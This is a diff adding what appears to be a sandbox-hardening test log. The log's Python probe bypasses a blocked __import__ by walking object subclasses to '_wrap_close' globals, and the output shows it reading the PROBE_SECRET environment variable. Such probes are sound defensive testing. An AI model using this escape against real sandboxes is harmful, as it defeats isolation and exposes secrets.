@@ -1,0 +1,12 @@
+probe P5 hardened=False
+code:
+try:
+    import os
+    print("ENV=" + str(os.environ.get("PROBE_SECRET")))
+except Exception as e:
+    print("import failed:", e)
+    osm = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__
+    print("ENV=" + str(osm["environ"].get("PROBE_SECRET")))
+
+{"ok": true, "result": null, "error": null, "ms": 11.9}
+stdout (46 chars): 'import failed: __import__ not found\nENV=s3cr3t'
